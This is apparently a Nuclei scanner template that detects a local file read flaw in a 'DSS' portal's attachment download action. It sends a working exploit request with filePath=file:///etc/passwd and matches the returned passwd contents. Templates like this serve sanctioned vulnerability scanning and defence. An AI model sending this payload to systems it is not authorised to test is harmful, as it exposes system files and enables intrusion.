id: dss-download-fileread

info:
  name: DSS Download File Read
  author: ritikchaddha
  severity: high
  tags: lfi,dss,lfr

requests:
  - method: GET
    path:
      - "{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"

    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"

      - type: status
        status:
          - 200
